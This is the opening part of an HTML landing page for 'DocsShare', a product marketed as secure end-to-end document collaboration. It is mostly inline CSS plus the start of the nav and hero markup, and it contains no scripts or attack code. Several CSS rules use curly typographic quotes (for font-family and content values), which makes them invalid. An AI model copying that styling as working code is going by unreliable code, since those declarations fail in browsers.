<!DOCTYPE html>

<html lang="en">

<head>
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">

  <link rel="icon" type="image/png" sizes="192x192" href="/images/favicon-192.png">
  <link rel="icon" type="image/png" sizes="512x512" href="/images/favicon-512.png">


  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DocsShare - E2E Collaboration</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link
    href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&family=Sora:wght@300;400;500;600;700;800&display=swap"
    rel="stylesheet">

  <meta property="og:type" content="website">
  <meta property="og:title" content="DocsShare - E2E Collaboration">
  <meta property="og:description"
    content="The modern workspace for teams who care about security. Share, edit, and collaborate on documents without compromising privacy.">

  <meta property="og:image" content="https://www.docs-share.org/images/preview.png">
  <meta name="twitter:image" content="https://www.docs-share.org/images/preview.png">

  <meta property="og:url" content="https://docs-share.org">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="DocsShare - E2E Collaboration">
  <meta name="twitter:description"
    content="The modern workspace for teams who care about security. Share, edit, and collaborate on documents without compromising privacy.">

  <style>
    ::-webkit-scrollbar {
      display: none;
    }

    html {
      -ms-overflow-style: none;
      /* IE and Edge */
      scrollbar-width: none;
      /* Firefox */
    }

    *,
    *::before,
    *::after {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html {
      scroll-behavior: smooth;
      font-size: 16px;
      background: #0a0e17;
    }

    body {
      font-family: ‘DM Sans’, sans-serif;
      background: #0a0e17;
      color: #f0f2f5;
      overflow-x: hidden;
      -webkit-font-smoothing: antialiased;
      -webkit-text-size-adjust: 100%;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 24px;
    }

    .fade-up {
      opacity: 0;
      transform: translateY(40px);
      transition: opacity 0.8s cubic-bezier(0.22, 1, 0.36, 1), transform 0.8s cubic-bezier(0.22, 1, 0.36, 1);
    }

    .fade-up.visible {
      opacity: 1;
      transform: translateY(0);
    }

    .fade-up-delay-1 {
      transition-delay: 0.12s;
    }

    .fade-up-delay-2 {
      transition-delay: 0.22s;
    }

    .fade-up-delay-3 {
      transition-delay: 0.32s;
    }

    .fade-up-delay-4 {
      transition-delay: 0.42s;
    }

    /* NAV */
    nav {
      position: fixed;
      top: 12px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 1000;
      width: calc(100% - 32px);
      max-width: 1100px;
      height: 58px;
      display: flex;
      align-items: center;
      padding: 0 8px 0 20px;
      border-radius: 20px;
      background: rgba(10, 14, 23, 0.75);
      -webkit-backdrop-filter: blur(28px) saturate(180%);
      backdrop-filter: blur(28px) saturate(180%);
      border: 1px solid rgba(255, 255, 255, 0.08);
      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.25), inset 0 1px 0 rgba(255, 255, 255, 0.06);
      transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
    }

    nav.scrolled {
      background: rgba(10, 14, 23, 0.9);
      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.35), inset 0 1px 0 rgba(255, 255, 255, 0.08);
    }

    .nav-inner {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .logo {
      font-family: ‘Sora’, sans-serif;
      font-weight: 700;
      font-size: 24px;
      color: #fff;
      text-decoration: none;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .logo-icon {
      width: 32px;
      height: 32px;
      background: linear-gradient(135deg, rgb(3, 169, 244), rgb(2, 136, 209));
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 10px rgba(3, 169, 244, 0.35);
      flex-shrink: 0;
      margin-right: 12px;
    }

    .nav-links {
      display: flex;
      align-items: center;
      gap: 32px;
      list-style: none;
    }

    .nav-links a {
      font-size: 0.88rem;
      font-weight: 500;
      color: rgba(255, 255, 255, 0.5);
      text-decoration: none;
      transition: color 0.25s;
    }

    .nav-links a:hover {
      color: #fff;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      padding: 18px 42px;
      border-radius: 14px;
      font-family: ‘DM Sans’, sans-serif;
      font-weight: 600;
      font-size: 1.15rem;
      text-decoration: none;
      transition: all 0.35s cubic-bezier(0.22, 1, 0.36, 1);
      cursor: pointer;
      border: none;
    }

    .btn-primary {
      background: linear-gradient(135deg, rgb(3, 169, 244), rgb(2, 136, 209));
      color: #fff;
      box-shadow: 0 2px 16px rgba(3, 169, 244, 0.35), inset 0 1px 0 rgba(255, 255, 255, 0.15);
    }

    .btn-primary:hover {
      box-shadow: 0 6px 28px rgba(3, 169, 244, 0.45);
      transform: translateY(-2px);
    }

    .btn-glass {
      background: rgba(255, 255, 255, 0.06);
      color: rgba(255, 255, 255, 0.8);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .btn-glass:hover {
      background: rgba(255, 255, 255, 0.1);
      color: #fff;
      transform: translateY(-2px);
    }

    .btn-nav {
      padding: 9px 20px;
      font-size: 0.84rem;
      border-radius: 12px;
    }

    .btn-white {
      background: #fff;
      color: #2b2b2b;
      font-weight: 600;
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
    }

    .btn-white:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.2);
    }

    .hamburger {
      display: none;
      flex-direction: column;
      gap: 5px;
      cursor: pointer;
      background: none;
      border: none;
      padding: 4px;
    }

    .hamburger span {
      width: 20px;
      height: 2px;
      background: #fff;
      border-radius: 2px;
      transition: all 0.3s;
    }

    /* HERO */
    .hero {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
      position: relative;
      overflow: hidden;
      background: linear-gradient(170deg, #0a0e17 0%, #0d1525 40%, #0f1a30 70%, #0a0e17 100%);
    }

    .orb {
      position: absolute;
      border-radius: 50%;
      filter: blur(80px);
      pointer-events: none;
      animation: orb-drift 14s ease-in-out infinite alternate;
    }

    .orb-1 {
      width: 500px;
      height: 500px;
      background: radial-gradient(circle, rgba(3, 169, 244, 0.15) 0%, transparent 70%);
      top: -10%;
      right: -8%;
    }

    .orb-2 {
      width: 350px;
      height: 350px;
      background: radial-gradient(circle, rgba(3, 169, 244, 0.1) 0%, transparent 70%);
      bottom: 5%;
      left: -5%;
      animation-delay: -4s;
    }

    .orb-3 {
      width: 250px;
      height: 250px;
      background: radial-gradient(circle, rgba(79, 195, 247, 0.08) 0%, transparent 70%);
      top: 35%;
      left: 12%;
      animation-delay: -8s;
    }

    @keyframes orb-drift {
      0% {
        transform: translate(0, 0) scale(1);
      }

      100% {
        transform: translate(30px, -20px) scale(1.08);
      }
    }

    .hero-grid {
      position: absolute;
      inset: 0;
      background-image: linear-gradient(rgba(3, 169, 244, 0.04) 1px, transparent 1px), linear-gradient(90deg, rgba(3, 169, 244, 0.04) 1px, transparent 1px);
      background-size: 80px 80px;
      -webkit-mask-image: radial-gradient(ellipse at center, rgba(0, 0, 0, 0.3) 0%, transparent 70%);
      mask-image: radial-gradient(ellipse at center, rgba(0, 0, 0, 0.3) 0%, transparent 70%);
      pointer-events: none;
    }

    .hero-content {
      text-align: center;
      max-width: 780px;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 100%;
      z-index: 2;
    }

    .hero-badge {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 7px 16px 7px 10px;
      border-radius: 50px;
      font-size: 0.78rem;
      font-weight: 500;
      color: rgb(79, 195, 247);
      margin-bottom: 32px;
      background: rgba(3, 169, 244, 0.08);
      border: 1px solid rgba(3, 169, 244, 0.15);
    }

    .hero-badge .dot {
      width: 8px;
      height: 8px;
      background: rgb(3, 169, 244);
      border-radius: 50%;
      animation: pulse-dot 2s infinite;
      box-shadow: 0 0 10px rgba(3, 169, 244, 0.5);
    }

    @keyframes pulse-dot {

      0%,
      100% {
        opacity: 1;
        transform: scale(1);
      }

      50% {
        opacity: 0.5;
        transform: scale(0.8);
      }
    }

    .hero h1 {
      font-family: ‘Sora’, sans-serif;
      font-size: 72px;
      font-weight: 700;
      line-height: 1.1;
      color: #fff;
      letter-spacing: -0.035em;
      margin-bottom: 24px;
    }

    .hero h1 .highlight {
      background: linear-gradient(135deg, rgb(79, 195, 247), rgb(3, 169, 244));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .hero p {
      font-size: 20px;
      color: rgba(255, 255, 255, 0.55);
      line-height: 1.7;
      max-width: 540px;
      margin: 0 auto 40px;
    }

    .hero-buttons {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 14px;
      flex-wrap: wrap;
      margin-top: 32px;
    }

    /* Floating glass cards */
    .floating-glass {
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      pointer-events: none;
      z-index: 1;
    }

    .glass-float {
      position: absolute;
      border-radius: 18px;
      background: rgba(20, 28, 50, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.07);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.06);
      padding: 18px;
      animation: glass-float 8s ease-in-out infinite;
      overflow: hidden;
    }

    .glass-float:nth-child(1) {
      top: 16%;
      left: 5%;
      width: 155px;
    }

    .glass-float:nth-child(2) {
      top: 22%;
      right: 4%;
      width: 145px;
      animation-delay: -2.5s;
      animation-duration: 9s;
    }

    .glass-float:nth-child(3) {
      bottom: 20%;
      left: 7%;
      width: 130px;
      animation-delay: -5s;
      animation-duration: 7s;
    }

    .glass-float:nth-child(4) {
      bottom: 16%;
      right: 6%;
      width: 148px;
      animation-delay: -1.5s;
      animation-duration: 10s;
    }

    .gf-icon {
      width: 28px;
      height: 28px;
      border-radius: 8px;
      background: rgba(3, 169, 244, 0.18);
      border: 1px solid rgba(79, 195, 247, 0.15);
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .gf-bar {
      height: 4px;
      border-radius: 2px;
      margin-bottom: 5px;
      background: rgba(255, 255, 255, 0.1);
    }

    .gf-bar:nth-child(2) {
      width: 85%;
    }

    .gf-bar:nth-child(3) {
      width: 60%;
    }

    .gf-bar.accent {
      background: rgba(79, 195, 247, 0.3);
    }

    @keyframes glass-float {

      0%,
      100% {
        transform: translateY(0) rotate(0deg);
      }

      33% {
        transform: translateY(-14px) rotate(0.8deg);
      }

      66% {
        transform: translateY(-8px) rotate(-0.5deg);
      }
    }

    /* TRUST */
    .trust-bar {
      padding: 56px 24px;
      text-align: center;
      background: #0a0e17;
      border-top: 1px solid rgba(255, 255, 255, 0.04);
    }

    .trust-bar p {
      font-size: 0.75rem;
      text-transform: uppercase;
      letter-spacing: 0.14em;
      color: rgba(255, 255, 255, 0.35);
      font-weight: 600;
      margin-bottom: 28px;
    }

    .trust-logos {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 48px;
      flex-wrap: wrap;
      opacity: 0.4;
    }

    .trust-logos span {
      font-family: ‘Sora’, sans-serif;
      font-size: 20px;
      font-weight: 600;
      color: #fff;
    }

    /* FEATURES */
    .features {
      padding: 120px 24px;
      position: relative;
      background: linear-gradient(180deg, #0a0e17 0%, #0d1525 50%, #0a0e17 100%);
      overflow: hidden;
    }

    .features-orb {
      position: absolute;
      width: 600px;
      height: 600px;
      border-radius: 50%;
      filter: blur(120px);
      background: radial-gradient(circle, rgba(3, 169, 244, 0.07) 0%, transparent 70%);
      top: 10%;
      right: -15%;
      pointer-events: none;
    }

    .section-label {
      font-size: 0.76rem;
      text-transform: uppercase;
      letter-spacing: 0.15em;
      color: rgb(3, 169, 244);
      font-weight: 600;
      margin-bottom: 14px;
      display: block;
    }

    .section-title {
      font-family: ‘Sora’, sans-serif;
      font-size: clamp(2rem, 4vw, 2.8rem);
      font-weight: 700;
      color: #fff;
      letter-spacing: -0.035em;
      line-height: 1.15;
      margin-bottom: 18px;
    }

    .section-subtitle {
      font-size: 1.02rem;
      color: rgba(255, 255, 255, 0.55);
      line-height: 1.7;
      max-width: 520px;
      margin-bottom: 60px;
    }

    .features-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 18px;
    }

    .feature-card {
      border-radius: 22px;
      padding: 36px 30px;
      transition: all 0.45s cubic-bezier(0.22, 1, 0.36, 1);
      background: rgba(18, 24, 42, 0.7);
      border: 1px solid rgba(255, 255, 255, 0.06);
      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.04);
      position: relative;
      overflow: hidden;
    }

    .feature-card::after {
      content: ‘’;
      position: absolute;
      top: -1px;
      left: -1px;
      right: -1px;
      height: 3px;
      background: linear-gradient(90deg, rgb(3, 169, 244), rgb(79, 195, 247));
      opacity: 0;
      transition: opacity 0.4s;
      border-radius: 22px 22px 0 0;
    }

    .feature-card:hover {
      transform: translateY(-6px);
      background: rgba(22, 30, 52, 0.85);
      border-color: rgba(3, 169, 244, 0.15);
      box-shadow: 0 20px 60px rgba(3, 169, 244, 0.08), 0 4px 16px rgba(0, 0, 0, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.06);
    }

    .feature-card:hover::after {
      opacity: 1;
    }

    .feature-icon {
      width: 50px;
      height: 50px;
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 22px;
      position: relative;
      z-index: 1;
      background: rgba(3, 169, 244, 0.12);
      border: 1px solid rgba(3, 169, 244, 0.18);
      transition: all 0.35s;
    }

    .feature-card:hover .feature-icon {
      background: rgba(3, 169, 244, 0.2);
      box-shadow: 0 4px 16px rgba(3, 169, 244, 0.25);
    }

    .feature-card h3 {
      font-family: ‘Sora’, sans-serif;
      font-size: 20px;
      font-weight: 600;
      color: #fff;
      margin-bottom: 10px;
      position: relative;
      z-index: 1;
    }

    .feature-card p {
      font-size: 0.9rem;
      color: rgba(255, 255, 255, 0.55);
      line-height: 1.65;
      position: relative;
      z-index: 1;
    }

    /* HOW IT WORKS */
    .how-it-works {
      padding: 120px 24px;
      background: #0a0e17;
    }

    .how-it-works .section-label,
    .how-it-works .section-title,
    .how-it-works .section-subtitle {
      text-align: center;
    }

    .how-it-works .section-subtitle {
      margin-left: auto;
      margin-right: auto;
    }

    .steps {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
      position: relative;
    }

    .steps::before {
      content: ‘’;
      position: absolute;
      top: 58px;
      left: 18%;
      right: 18%;
      height: 2px;
      background: linear-gradient(90deg, transparent, rgba(3, 169, 244, 0.15), rgba(3, 169, 244, 0.15), transparent);
    }

    .step {
      text-align: center;
      position: relative;
      z-index: 2;
      padding: 32px 24px;
      border-radius: 22px;
      background: rgba(18, 24, 42, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.06);
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.04);
      transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
      overflow: hidden;
    }

    .step:hover {
      transform: translateY(-4px);
      background: rgba(22, 30, 52, 0.7);
    }

    .step-num {
      width: 52px;
      height: 52px;
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: ‘Sora’, sans-serif;
      font-weight: 700;
      font-size: 1.15rem;
      margin: 0 auto 22px;
      position: relative;
      z-index: 1;
      background: rgba(3, 169, 244, 0.12);
      color: rgb(79, 195, 247);
      border: 1px solid rgba(79, 195, 247, 0.2);
      transition: all 0.35s;
    }

    .step:hover .step-num {
      background: linear-gradient(135deg, rgb(3, 169, 244), rgb(2, 136, 209));
      color: #fff;
      border-color: transparent;
      box-shadow: 0 4px 16px rgba(3, 169, 244, 0.35);
    }

    .step h3 {
      font-family: ‘Sora’, sans-serif;
      font-size: 20px;
      font-weight: 600;
      color: #fff;
      margin-bottom: 10px;
      position: relative;
      z-index: 1;
    }

    .step p {
      font-size: 0.9rem;
      color: rgba(255, 255, 255, 0.55);
      line-height: 1.65;
      max-width: 280px;
      margin: 0 auto;
      position: relative;
      z-index: 1;
    }

    /* SHOWCASE */
    .showcase {
      padding: 120px 24px;
      background: linear-gradient(170deg, #0d1525 0%, #0f1a30 50%, #0a1020 100%);
      position: relative;
      overflow: hidden;
    }

    .showcase-orb {
      position: absolute;
      border-radius: 50%;
      filter: blur(100px);
      pointer-events: none;
    }

    .showcase-orb-1 {
      width: 500px;
      height: 500px;
      background: radial-gradient(circle, rgba(3, 169, 244, 0.1) 0%, transparent 70%);
      top: -10%;
      left: 50%;
      transform: translateX(-50%);
    }

    .showcase-orb-2 {
      width: 300px;
      height: 300px;
      background: radial-gradient(circle, rgba(79, 195, 247, 0.06) 0%, transparent 70%);
      bottom: -5%;
      right: -5%;
    }

    .showcase-inner {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 72px;
      align-items: center;
      position: relative;
      z-index: 2;
    }

    .showcase-text .section-label {
      color: rgb(79, 195, 247);
    }

    .showcase-text p {
      font-size: 1.02rem;
      color: rgba(255, 255, 255, 0.55);
      line-height: 1.7;
      margin-bottom: 32px;
    }

    .showcase-text ul {
      list-style: none;
      display: flex;
      flex-direction: column;
      gap: 14px;
      margin-bottom: 36px;
    }

    .showcase-text li {
      display: flex;
      align-items: center;
      gap: 12px;
      font-size: 0.92rem;
      color: rgba(255, 255, 255, 0.6);
    }

    .check-icon {
      width: 24px;
      height: 24px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      background: rgba(3, 169, 244, 0.15);
      border: 1px solid rgba(79, 195, 247, 0.25);
    }

    /* Doc Preview */
    .showcase-visual {
      display: flex;
      justify-content: center;
    }

    .doc-preview {
      width: 100%;
      max-width: 420px;
      border-radius: 22px;
      overflow: hidden;
      background: rgba(18, 24, 42, 0.7);
      border: 1px solid rgba(255, 255, 255, 0.07);
      box-shadow: 0 32px 64px rgba(0, 0, 0, 0.35), inset 0 1px 0 rgba(255, 255, 255, 0.05);
    }

    .doc-preview-header {
      padding: 16px 20px;
      display: flex;
      align-items: center;
      gap: 10px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    }

    .dots {
      display: flex;
      gap: 6px;
    }

    .dots span {
      width: 10px;
      height: 10px;
      border-radius: 50%;
    }

    .dots span:nth-child(1) {
      background: #ff5f57;
    }

    .dots span:nth-child(2) {
      background: #febc2e;
    }

    .dots span:nth-child(3) {
      background: #28c840;
    }

    .doc-name {
      font-size: 0.76rem;
      color: rgba(255, 255, 255, 0.35);
      font-weight: 500;
      margin-left: 8px;
    }

    .doc-preview-body {
      padding: 28px 24px;
    }

    .doc-line {
      height: 5px;
      border-radius: 3px;
      margin-bottom: 9px;
      opacity: 0;
      animation: type-line 0.5s forwards;
    }

    .doc-line:nth-child(1) {
      width: 65%;
      background: rgba(79, 195, 247, 0.35);
      animation-delay: 0.3s;
    }

    .doc-line:nth-child(2) {
      width: 100%;
      background: rgba(255, 255, 255, 0.1);
      animation-delay: 0.5s;
    }

    .doc-line:nth-child(3) {
      width: 88%;
      background: rgba(255, 255, 255, 0.1);
      animation-delay: 0.7s;
    }

    .doc-line:nth-child(4) {
      width: 55%;
      background: rgba(255, 255, 255, 0.1);
      animation-delay: 0.9s;
    }

    .doc-line:nth-child(5) {
      width: 100%;
      background: rgba(255, 255, 255, 0.05);
      animation-delay: 1.1s;
      margin-top: 18px;
    }

    .doc-line:nth-child(6) {
      width: 80%;
      background: rgba(255, 255, 255, 0.1);
      animation-delay: 1.3s;
    }

    .doc-line:nth-child(7) {
      width: 70%;
      background: rgba(255, 255, 255, 0.1);
      animation-delay: 1.5s;
    }

    .doc-line:nth-child(8) {
      width: 42%;
      background: rgba(255, 255, 255, 0.07);
      animation-delay: 1.7s;
    }

    .doc-cursor {
      display: inline-block;
      width: 2px;
      height: 14px;
      background: rgb(79, 195, 247);
      animation: blink 1s infinite;
      border-radius: 1px;
      box-shadow: 0 0 12px rgba(79, 195, 247, 0.8);
    }

    @keyframes type-line {
      from {
        opacity: 0;
        transform: scaleX(0);
        transform-origin: left;
      }

      to {
        opacity: 1;
        transform: scaleX(1);
      }
    }

    @keyframes blink {

      0%,
      100% {
        opacity: 1;
      }

      50% {
        opacity: 0;
      }
    }

    .doc-avatars {
      display: flex;
      align-items: center;
      padding: 14px 24px;
      border-top: 1px solid rgba(255, 255, 255, 0.05);
    }

    .doc-avatar {
      width: 28px;
      height: 28px;
      border-radius: 50%;
      border: 2px solid rgba(10, 14, 23, 0.8);
      margin-left: -7px;
      font-size: 0.62rem;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-weight: 600;
    }

    .doc-avatar:first-child {
      margin-left: 0;
    }

    .doc-avatar:nth-child(1) {
      background: rgb(3, 169, 244);
    }

    .doc-avatar:nth-child(2) {
      background: #e91e63;
    }

    .doc-avatar:nth-child(3) {
      background: #ff9800;
    }

    .doc-collab-text {
      font-size: 0.7rem;
      color: rgba(255, 255, 255, 0.35);
      margin-left: 10px;
    }

    /* STATS */
    .stats {
      padding: 80px 24px;
      background: #0a0e17;
    }

    .stats-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 18px;
      text-align: center;
    }

    .stat {
      padding: 32px 16px;
      border-radius: 20px;
      background: rgba(18, 24, 42, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.06);
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.12), inset 0 1px 0 rgba(255, 255, 255, 0.04);
      transition: all 0.35s;
    }

    .stat:hover {
      transform: translateY(-3px);
      background: rgba(22, 30, 52, 0.7);
    }

    .stat-number {
      font-family: ‘Sora’, sans-serif;
      font-size: clamp(1.8rem, 3.5vw, 2.5rem);
      font-weight: 700;
      color: rgb(79, 195, 247);
      letter-spacing: -0.03em;
      margin-bottom: 6px;
    }

    .stat-label {
      font-size: 16px;
      color: rgba(255, 255, 255, 0.55);
      font-weight: 500;
    }

    /* TESTIMONIALS */
    .testimonials {
      padding: 120px 24px;
      background: linear-gradient(180deg, #0a0e17 0%, #0d1525 100%);
    }

    .testimonials .section-label,
    .testimonials .section-title {
      text-align: center;
    }

    .testimonials .section-subtitle {
      text-align: center;
      margin-left: auto;
      margin-right: auto;
    }

    .testimonial-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 18px;
    }

    .testimonial-card {
      border-radius: 22px;
      padding: 34px 28px;
      transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
      background: rgba(18, 24, 42, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.06);
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.12), inset 0 1px 0 rgba(255, 255, 255, 0.04);
      overflow: hidden;
    }

    .testimonial-card:hover {
      box-shadow: 0 16px 48px rgba(0, 0, 0, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.06);
      transform: translateY(-4px);
      background: rgba(22, 30, 52, 0.7);
    }

    .testimonial-stars {
      color: #FFB400;
      font-size: 0.82rem;
      letter-spacing: 2px;
      margin-bottom: 18px;
    }

    .testimonial-card blockquote {
      font-size: 0.92rem;
      color: rgba(255, 255, 255, 0.7);
      line-height: 1.7;
      font-style: italic;
      margin-bottom: 22px;
    }

    .testimonial-author {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .testimonial-avatar {
      width: 38px;
      height: 38px;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 0.8rem;
      color: #fff;
    }

    .testimonial-author-info h4 {
      font-size: 0.86rem;
      font-weight: 600;
      color: #fff;
    }

    .testimonial-author-info span {
      font-size: 0.76rem;
      color: rgba(255, 255, 255, 0.35);
    }

    /* CTA */
    .cta {
      padding: 120px 24px;
      text-align: center;
      background: #0a0e17;
    }

    .cta-card {
      border-radius: 28px;
      padding: 80px 48px;
      position: relative;
      overflow: hidden;
      background: rgba(3, 169, 244, 0.06);
      border: 1px solid rgba(3, 169, 244, 0.12);
      box-shadow: 0 32px 80px rgba(0, 0, 0, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.05);
    }

    .cta-orb {
      position: absolute;
      border-radius: 50%;
      filter: blur(80px);
      pointer-events: none;
    }

    .cta-orb-1 {
      width: 350px;
      height: 350px;
      background: radial-gradient(circle, rgba(3, 169, 244, 0.12) 0%, transparent 70%);
      top: -20%;
      right: -5%;
    }

    .cta-orb-2 {
      width: 250px;
      height: 250px;
      background: radial-gradient(circle, rgba(79, 195, 247, 0.08) 0%, transparent 70%);
      bottom: -15%;
      left: -3%;
    }

    .cta-card .section-title {
      position: relative;
      z-index: 2;
    }

    .cta-card p {
      font-size: 1.05rem;
      color: rgba(255, 255, 255, 0.55);
      line-height: 1.7;
      max-width: 480px;
      margin: 0 auto 36px;
      position: relative;
      z-index: 2;
    }

    .cta-buttons {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 14px;
      flex-wrap: wrap;
      position: relative;
      z-index: 2;
    }

    /* FOOTER */
    footer {
      padding: 72px 24px 36px;
      background: #0a0e17;
      border-top: 1px solid rgba(255, 255, 255, 0.04);
    }

    .footer-grid {
      display: grid;
      grid-template-columns: 2fr 1fr 1fr 1fr;
      gap: 48px;
      margin-bottom: 52px;
    }

    .footer-brand .logo {
      margin-bottom: 14px;
    }

    .footer-brand p {
      font-size: 0.86rem;
      color: rgba(255, 255, 255, 0.35);
      line-height: 1.65;
      max-width: 280px;
    }

    .footer-col h4 {
      font-family: ‘Sora’, sans-serif;
      font-size: 0.78rem;
      font-weight: 600;
      color: rgba(255, 255, 255, 0.7);
      text-transform: uppercase;
      letter-spacing: 0.08em;
      margin-bottom: 18px;
    }

    .footer-col ul {
      list-style: none;
      display: flex;
      flex-direction: column;
      gap: 11px;
    }

    .footer-col a {
      font-size: 0.86rem;
      color: rgba(255, 255, 255, 0.35);
      text-decoration: none;
      transition: color 0.25s;
    }

    .footer-col a:hover {
      color: rgb(79, 195, 247);
    }

    .footer-bottom {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding-top: 28px;
      border-top: 1px solid rgba(255, 255, 255, 0.04);
    }

    .footer-bottom p {
      font-size: 0.78rem;
      color: rgba(255, 255, 255, 0.35);
    }

    .footer-bottom-links {
      display: flex;
      gap: 24px;
    }

    .footer-bottom-links a {
      font-size: 0.78rem;
      color: rgba(255, 255, 255, 0.35);
      text-decoration: none;
      transition: color 0.25s;
    }

    .footer-bottom-links a:hover {
      color: rgb(79, 195, 247);
    }

    /* RESPONSIVE */
    @media (max-width: 1024px) {
      .features-grid {
        grid-template-columns: repeat(2, 1fr);
      }

      .showcase-inner {
        grid-template-columns: 1fr;
        gap: 48px;
      }

      .showcase-visual {
        order: -1;
      }

      .stats-grid {
        grid-template-columns: repeat(2, 1fr);
      }

      .footer-grid {
        grid-template-columns: 1fr 1fr;
      }
    }

    @media (max-width: 768px) {
      .nav-links {
        display: none;
      }

      .hamburger {
        display: flex;
      }

      .nav-links.open {
        display: flex;
        flex-direction: column;
        position: absolute;
        top: 66px;
        left: 0;
        right: 0;
        padding: 24px;
        gap: 18px;
        border-radius: 0 0 20px 20px;
        background: rgba(10, 14, 23, 0.95);
        border: 1px solid rgba(255, 255, 255, 0.06);
        border-top: none;
        box-shadow: 0 16px 48px rgba(0, 0, 0, 0.3);
      }

      nav {
        width: calc(100% - 24px);
        top: 8px;
      }

      .hero {
        padding: 100px 24px 60px;
        min-height: auto;
      }

      .glass-float {
        display: none;
      }

      .features-grid {
        grid-template-columns: 1fr;
      }

      .steps {
        grid-template-columns: 1fr;
        gap: 14px;
      }

      .steps::before {
        display: none;
      }

      .testimonial-grid {
        grid-template-columns: 1fr;
      }

      .cta-card {
        padding: 52px 24px;
      }

      .footer-grid {
        grid-template-columns: 1fr;
        gap: 28px;
      }

      .footer-bottom {
        flex-direction: column;
        gap: 14px;
        text-align: center;
      }
    }

    @media (max-width: 480px) {
      .stats-grid {
        grid-template-columns: 1fr;
      }

      .hero-buttons {
        flex-direction: column;
        width: 100%;
      }

      .hero-buttons .btn {
        width: 100%;
      }
    }
  </style>

</head>

<body>

  <nav id="navbar">
    <div class="nav-inner">
      <a href="#" class="logo">
        <div class="logo-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="rgb(255,255,255)"
            stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
            <polyline points="14 2 14 8 20 8" />
            <line x1="16" y1="13" x2="8" y2="13" />
            <line x1="16" y1="17" x2="8" y2="17" />
          </svg></div>
        DocsShare
      </a>

    </div>
  </nav>

  <section class="hero" id="hero">
    <div class="hero-grid"></div>
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
    <div class="orb orb-3"></div>
    <div class="floating-glass">
      <div class="glass-float">
        <div class="gf-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgb(79,195,247)"
            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
          </svg></div>
        <div class="gf-bar accent"></div>
        <div class="gf-bar"></div>
        <div class="gf-bar"></div>
      </div>
      <div class="glass-float">
        <div class="gf-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgb(79,195,247)"
            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
            <circle cx="9" cy="7" r="4" />
